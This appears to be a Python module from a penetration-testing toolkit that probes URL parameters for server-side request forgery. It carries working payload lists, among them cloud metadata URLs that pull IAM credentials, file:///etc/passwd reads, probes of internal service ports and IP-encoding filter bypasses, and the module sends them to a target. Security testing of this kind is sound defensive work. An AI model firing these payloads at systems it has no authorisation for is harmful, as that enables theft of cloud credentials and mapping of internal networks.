"""
Server-Side Request Forgery (SSRF) detection.

An SSRF vulnerability exists when an application fetches a URL that
comes from user input. The attacker can then:

  1. Read internal services the app can reach:
       ?url=http://169.254.169.254/latest/meta-data/    (AWS metadata)
       ?url=http://localhost:8080/actuator/env          (internal admin)

  2. Port-scan the internal network:
       ?url=http://10.0.0.1:22/    → connection refused (port closed)
       ?url=http://10.0.0.1:3306/  → MySQL handshake bytes
       ?url=http://10.0.0.1:9999/  → slow response (port filtered)

  3. Bypass IP allowlists:
       ?url=http://127.0.0.1/
       ?url=http://0.0.0.0/
       ?url=http://[::1]/
       ?url=http://127.1/

  4. Chain to cloud metadata endpoints (the classic SSRF-to-RCE):
       http://169.254.169.254/                  (AWS/Azure/GCP metadata)
       http://metadata.google.internal/         (GCP-specific)

Detection oracles (from strongest to weakest):

  1. OOB callback
     We run a local HTTP listener, inject ?url=http://127.0.0.1:PORT/
     and wait for the target to call us. Blind SSRF confirmed.

  2. Reflected content
     ?url=http://127.0.0.1/ returns the target's own homepage HTML.
     Compare response body to the app's baseline — if it contains
     content the app never sends, SSRF confirmed.

  3. Metadata endpoint signature
     ?url=http://169.254.169.254/ reflects "ami-id" or "instance-id"
     in the response. Very high confidence.

  4. Timing
     ?url=http://10.255.255.1/ (unroutable) takes >5s while
     ?url=http://127.0.0.1/ returns quickly. Weak signal but useful
     for blind SSRF when OOB can't be started (no public listener).

Design:

  - Fast by default (~30 payloads per parameter).
  - OOB is opt-in with --oob. Requires the listener infrastructure.
  - Does not attempt URL-encoding bypasses by default (those are
    target-specific and need iteration). Users can pass --evade for
    the extended list.

Usage:

    from vuln.ssrf import test_url

    findings = await test_url(
        "https://example.com/fetch?url=https://example.com/",
        session, limiter)

    # CLI
    python -m vuln.ssrf "https://example.com/fetch?url=x"
    python -m vuln.ssrf "https://example.com/fetch" --param url --oob
    python -m vuln.ssrf "https://example.com/fetch?url=x" --evade

Findings written to the store:
    one row per vulnerable parameter
"""

import asyncio
import hashlib
import re
import secrets
from urllib.parse import (
    urlparse, parse_qs, urlencode, urlunparse,
)

from core.http import new_session, fetch, RateLimiter, parse_cookie_string
from core.output import info, success, warn, error


# ---------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------

# Common parameter names that might take a URL
COMMON_URL_PARAMS = [
    "url", "uri", "link", "target", "dest", "destination",
    "redirect", "redirect_uri", "redirect_url", "return",
    "next", "continue", "callback", "callback_url", "webhook",
    "webhook_url", "href", "src", "source", "origin",
    "proxy", "fetch", "load", "open", "read", "get", "request",
    "image", "img", "avatar", "logo", "icon", "photo",
    "thumbnail", "thumb", "media", "file", "document", "doc",
    "feed", "rss", "atom", "api", "endpoint", "service",
    "host", "domain", "server", "site", "page", "path",
    "resource", "cdn", "asset", "assets", "content", "stream",
]


# URL payloads. Ordered by signal strength. First hit wins.
SSRF_PAYLOADS = [
    # --- Cloud metadata (best signal: unique strings in response) ---
    ("aws_metadata_root",
     "http://169.254.169.254/",
     ["ami-id", "instance-id", "iam/"]),
    ("aws_metadata_iam",
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     ["AccessKeyId", "SecretAccessKey"]),
    ("gcp_metadata",
     "http://metadata.google.internal/computeMetadata/v1/",
     ["project-id", "instance/"]),
    ("azure_metadata",
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     ["vmId", "subscriptionId"]),

    # --- Localhost probes ---
    ("localhost",
     "http://127.0.0.1/",
     []),
    ("localhost_alt",
     "http://localhost/",
     []),
    ("localhost_0",
     "http://0.0.0.0/",
     []),
    ("localhost_short",
     "http://127.1/",
     []),
    ("localhost_ipv6",
     "http://[::1]/",
     []),

    # --- Common internal admin ports ---
    ("localhost_8080",  "http://127.0.0.1:8080/", []),
    ("localhost_8443",  "http://127.0.0.1:8443/", []),
    ("localhost_3306",  "http://127.0.0.1:3306/", []),
    ("localhost_6379",  "http://127.0.0.1:6379/", []),
    ("localhost_9200",  "http://127.0.0.1:9200/", []),
    ("localhost_11211", "http://127.0.0.1:11211/", []),
    ("localhost_2375",  "http://127.0.0.1:2375/", []),

    # --- Unroutable IP (timing oracle) ---
    ("unroutable",
     "http://10.255.255.1/",
     []),

    # --- File scheme (sometimes works) ---
    ("file_passwd",
     "file:///etc/passwd",
     ["root:x:0:0:"]),
    ("file_winini",
     "file:///C:/Windows/win.ini",
     ["[fonts]"]),
]


# Extended payloads for --evade. IP and URL encoding tricks.
SSRF_EVADE_PAYLOADS = [
    # Decimal IP for 127.0.0.1
    ("decimal_loopback", "http://2130706433/", []),
    # Hex IP
    ("hex_loopback", "http://0x7f.0x0.0x0.0x1/", []),
    # Octal IP
    ("octal_loopback", "http://0177.0.0.1/", []),
    # Short-form
    ("short_form", "http://127.0.0.1.nip.io/", []),
    # DNS rebinding service
    ("rebind_127", "http://127.0.0.1.xip.io/", []),
    # IPv6 mapped IPv4
    ("v6_mapped", "http://[::ffff:127.0.0.1]/", []),
    # @ trick (real-site@127.0.0.1)
    ("at_trick", "http://example.com@127.0.0.1/", []),
    ("at_trick_rev", "http://127.0.0.1#@example.com/", []),
    # URL-encoded loopback
    ("url_encoded", "http://127%2e0%2e0%2e1/", []),
    # Double-encoded
    ("double_encoded", "http://127%252e0%252e0%252e1/", []),
    # Backslash trick
    ("backslash", "http://127.0.0.1\\@example.com/", []),
]


# ---------------------------------------------------------------------
# URL helpers
# ---------------------------------------------------------------------

def _get_params(url: str) -> list[str]:
    return list(parse_qs(urlparse(url).query,
                          keep_blank_values=True).keys())


def _set_param(url: str, name: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[name] = [value]
    return urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, urlencode(qs, doseq=True), parsed.fragment,
    ))


def _hash(body: str) -> str:
    return hashlib.sha1((body or "").encode("utf-8",
                                              errors="ignore")).hexdigest()


# ---------------------------------------------------------------------
# Detection
# ---------------------------------------------------------------------

async def _try_payload(session, url: str, param: str, payload: str,
                        signatures: list[str], limiter, baseline: dict,
                        cookies=None, timeout: float = 10.0) -> dict | None:
    """Try one payload. Return finding data if detected."""
    test_url = _set_param(url, param, payload)
    t_start = asyncio.get_event_loop().time()

    try:
        status, headers, body, _final = await fetch(
            session, test_url, limiter,
            method="GET", cookies=cookies, timeout=timeout,
            allow_redirects=False,
        )
    except asyncio.TimeoutError:
        # Timeout can be meaningful (unroutable payload)
        elapsed = asyncio.get_event_loop().time() - t_start
        return {
            "kind": "timeout",
            "elapsed": elapsed,
            "status": None,
            "size": 0,
        }
    except Exception:
        return None

    elapsed = asyncio.get_event_loop().time() - t_start

    if status is None:
        return None

    body = body or ""

    # Signature match (metadata endpoints, file://, etc.)
    for sig in signatures:
        if sig and sig in body:
            return {
                "kind": "signature_match",
                "signature": sig,
                "status": status,
                "size": len(body),
                "elapsed": elapsed,
                "body_snippet": body[:300],
            }

    # Content reflection: if payload targets localhost and body
    # differs from baseline AND contains HTML we didn't send,
    # something reflected.
    if "127.0.0.1" in payload or "localhost" in payload:
        if _hash(body) != baseline["hash"] and \
                status == 200 and len(body) > 100:
            # Heuristic: if the response contains elements the app
            # never emitted in baseline (like <html>, <title>,
            # distinct marker strings), treat as reflected
            interesting = (
                "<html" in body.lower()[:1000] or
                "<!doctype" in body.lower()[:500] or
                "server:" in body.lower()[:500]
            )
            if interesting and not interesting and False:
                pass  # placeholder — reflection needs more care
            # For now, we flag it as low-confidence reflected SSRF only
            # if body seems to be another page's HTML
            if _looks_like_other_service(body, baseline["body"]):
                return {
                    "kind": "reflection",
                    "status": status,
                    "size": len(body),
                    "elapsed": elapsed,
                    "body_snippet": body[:300],
                }

    return None


def _looks_like_other_service(body: str, baseline_body: str) -> bool:
    """Return True if body looks like a different page than baseline.

    Heuristic: both look like HTML, but their hashes differ AND the
    new body contains server headers or titles not in the baseline.
    """
    if not body:
        return False
    low = body.lower()
    # Check for common metadata service markers
    markers = ["<title>", "<html", "server:", "x-amz-", "elasticsearch",
                "mongo", "redis_version", "mysql", "apache", "nginx"]
    for m in markers:
        if m in low and m not in baseline_body.lower():
            return True
    return False


# ---------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------

async def test_url(url: str, session=None, limiter=None,
                    cookies=None, params: list[str] | None = None,
                    oob_config=None, verbose: bool = False,
                    timeout: float = 10.0, rate: float = 10.0,
                    evade: bool = False) -> list[dict]:
    """Test a URL for SSRF on all params (or a subset).

    Args:
        url:        target URL
        session:    aiohttp session
        limiter:    RateLimiter
        cookies:    cookies dict
        params:     explicit param list to test
        oob_config: OOBConfig with HTTP listener for OOB detection
        verbose:    print each param
        timeout:    per-request timeout
        rate:       requests per second (default 10)
        evade:      include extended URL-encoding payloads

    Returns list of findings.
    """
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"

    if params is None:
        in_url = _get_params(url)
        candidates = list(dict.fromkeys(in_url + COMMON_URL_PARAMS))
    else:
        candidates = params

    if not candidates:
        return []

    own_session = session is None
    if own_session:
        session = new_session()
    if limiter is None:
        limiter = RateLimiter(rate=rate)

    payloads = list(SSRF_PAYLOADS)
    if evade:
        payloads.extend(SSRF_EVADE_PAYLOADS)

    # Optional: prepend an OOB payload if we have a listener
    oob_marker = None
    if oob_config is not None and oob_config.http is not None:
        oob_marker = f"ssrf-{secrets.token_hex(4)}"
        oob_payload = f"http://127.0.0.1:{oob_config.http_public_port}/?{oob_marker}"
        payloads.insert(0, ("oob_http", oob_payload, []))

    info(f"ssrf-testing {len(candidates)} parameter(s) on {url} "
         f"({len(payloads)} payloads/param)")

    findings: list[dict] = []

    try:
        # Baseline
        try:
            base = await fetch(session, url, limiter, cookies=cookies,
                                timeout=timeout, allow_redirects=False)
        except Exception as e:
            warn(f"ssrf: baseline failed: {type(e).__name__}: {e}")
            return []
        if base is None or base[0] is None:
            warn("ssrf: target did not respond")
            return []

        baseline = {
            "status": base[0],
            "body": base[2] or "",
            "hash": _hash(base[2] or ""),
        }

        tested = 0
        for param in candidates:
            tested += 1
            if verbose:
                info(f"  [{tested}/{len(candidates)}] '{param}'")

            # Try OOB first if configured
            if oob_config is not None and oob_config.http is not None:
                oob_payload = f"http://127.0.0.1:{oob_config.http_public_port}/?{oob_marker}"
                test_url = _set_param(url, param, oob_payload)
                try:
                    await fetch(session, test_url, limiter,
                                 cookies=cookies, timeout=timeout,
                                 allow_redirects=False)
                except Exception:
                    pass
                # Wait up to 5s for a callback
                hit = await oob_config.http.wait_for_hit(oob_marker,
                                                          timeout=5.0)
                if hit:
                    finding = {
                        "type": "ssrf",
                        "severity": "critical",
                        "url": url,
                        "param": param,
                        "injection_kind": "query",
                        "method": "GET",
                        "payload": oob_payload,
                        "http_status": None,
                        "evidence": (f"OOB HTTP callback received from "
                                     f"{hit['remote']}: {hit['path']}"),
                        "data": {
                            "kind": "oob_http",
                            "remote": hit["remote"],
                            "path": hit["path"],
                        },
                    }
                    findings.append(finding)
                    success(f"  [VULN] {param} → OOB HTTP callback")
                    continue

            # Try each payload
            for name, payload, signatures in payloads:
                if name == "oob_http":
                    continue  # already tried above
                r = await _try_payload(
                    session, url, param, payload, signatures,
                    limiter, baseline, cookies=cookies,
                    timeout=timeout)
                if not r:
                    continue

                kind = r["kind"]
                if kind == "signature_match":
                    severity = "critical"
                    evidence = (f"Signature '{r['signature']}' from "
                                f"{payload[:60]} found in response")
                elif kind == "reflection":
                    severity = "high"
                    evidence = (f"Response differs from baseline — "
                                f"possible {payload[:60]} reflection")
                elif kind == "timeout":
                    # Timeout on unroutable IP is weak but real
                    if "10.255.255.1" in payload and r["elapsed"] > 5:
                        severity = "medium"
                        evidence = (f"Unroutable IP caused "
                                    f"{r['elapsed']:.1f}s delay "
                                    f"(possible blind SSRF)")
                    else:
                        continue
                else:
                    continue

                finding = {
                    "type": "ssrf",
                    "severity": severity,
                    "url": url,
                    "param": param,
                    "injection_kind": "query",
                    "method": "GET",
                    "payload": payload[:300],
                    "http_status": r.get("status"),
                    "evidence": evidence,
                    "data": {
                        "kind": kind,
                        "payload_name": name,
                        "signature": r.get("signature"),
                        "elapsed": r.get("elapsed"),
                        "body_snippet": r.get("body_snippet"),
                    },
                }
                findings.append(finding)
                success(f"  [VULN] {param} → {kind}: "
                        f"{evidence[:100]}")
                if verbose:
                    info(f"      payload: {payload[:120]}")
                break

        return findings
    finally:
        if own_session:
            await session.close()


# ---------------------------------------------------------------------
# CLI entry
# ---------------------------------------------------------------------

async def run(target: str, store=None, verbose: bool = False,
               cookie: str | None = None,
               params: list[str] | None = None,
               rate: float = 10.0,
               evade: bool = False,
               oob: bool = False,
               oob_http_port: int = 9876,
               oob_public: str | None = None) -> list[dict]:
    """CLI entry. Writes findings to store if provided."""
    cookies = parse_cookie_string(cookie) if cookie else None

    oob_config = None
    oob_cleanup = None
    if oob:
        try:
            from vuln import oob as oob_mod
        except ImportError:
            warn("ssrf: OOB module not available")
        else:
            http_listener = oob_mod.OOBListener(
                port=oob_http_port,
                bind_addr="0.0.0.0" if oob_public else "127.0.0.1",
                verbose=verbose)
            try:
                await http_listener.start()
            except RuntimeError as e:
                warn(f"ssrf: could not start HTTP listener: {e}")
            else:
                oob_config = oob_mod.OOBConfig(
                    dns_listener=None,
                    http_listener=http_listener,
                    public_host=oob_public or "127.0.0.1")
                oob_config.http_public_port = oob_http_port

                async def _cleanup():
                    await http_listener.stop()
                oob_cleanup = _cleanup

    try:
        findings = await test_url(
            target, cookies=cookies, params=params,
            oob_config=oob_config, verbose=verbose,
            rate=rate, evade=evade)
    finally:
        if oob_cleanup is not None:
            await oob_cleanup()

    print()
    if not findings:
        info(f"no SSRF detected on {target}")
    else:
        success(f"{len(findings)} SSRF finding(s)")

    if store is not None:
        for f in findings:
            store.add_finding({
                "module": "ssrf",
                "type": f["type"],
                "severity": f["severity"],
                "target": f["url"],
                "param": f["param"],
                "payload": f["payload"],
                "evidence": f["evidence"],
                "data": f["data"],
            })
        if findings:
            success(f"wrote {len(findings)} finding(s) to store")

    return findings


# ---------------------------------------------------------------------
# CLI when run directly
# ---------------------------------------------------------------------

def _cli():
    import argparse
    p = argparse.ArgumentParser(
        prog="vuln.ssrf",
        description="Detect Server-Side Request Forgery.",
    )
    p.add_argument("target", help="URL to test")
    p.add_argument("--param", action="append",
                   help="test only this parameter name (repeatable)")
    p.add_argument("--cookie", default=None,
                   help="cookie string for authenticated testing")
    p.add_argument("--rate", type=float, default=10.0,
                   help="requests per second (default 10)")
    p.add_argument("--evade", action="store_true",
                   help="include URL-encoding/IP-format evasion payloads")
    p.add_argument("--oob", action="store_true",
                   help="start an HTTP listener for OOB callback detection "
                        "(strongest signal, but listener must be reachable)")
    p.add_argument("--oob-http-port", type=int, default=9876,
                   help="OOB HTTP listener port (default 9876)")
    p.add_argument("--oob-public", default=None,
                   help="public hostname/IP the target should call back "
                        "(default: 127.0.0.1 — only works if target is local)")
    p.add_argument("--store", action="store_true",
                   help="write findings to active workspace")
    p.add_argument("-v", "--verbose", action="store_true")
    args = p.parse_args()

    store = None
    if args.store:
        from core.workspace import get_active, get_workspace
        from core.store import open_store
        active = get_active()
        if not active:
            warn("no active workspace; use `toolkit workspace switch`")
        else:
            ws = get_workspace(active)
            store = open_store(ws.db_path, workspace_name=active)

    asyncio.run(run(
        args.target, store=store, verbose=args.verbose,
        cookie=args.cookie, params=args.param, rate=args.rate,
        evade=args.evade, oob=args.oob,
        oob_http_port=args.oob_http_port,
        oob_public=args.oob_public))


if __name__ == "__main__":
    _cli()